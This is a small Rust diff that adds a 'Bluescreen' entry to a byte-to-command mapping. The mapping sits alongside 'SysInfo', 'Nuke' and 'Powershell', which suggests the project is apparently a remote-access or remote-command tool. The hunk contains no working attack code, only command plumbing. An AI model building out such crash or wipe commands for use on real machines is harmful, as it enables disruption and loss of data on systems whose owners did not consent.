@@ -17,6 +17,7 @@ impl From<u8> for Codes {
             64 => Codes::SysInfo,
             65 => Codes::Nuke,
             66 => Codes::Powershell,
+            67 => Codes::Bluescreen,
             _ => panic!("Invalid MessageCode value"),
         }
     }
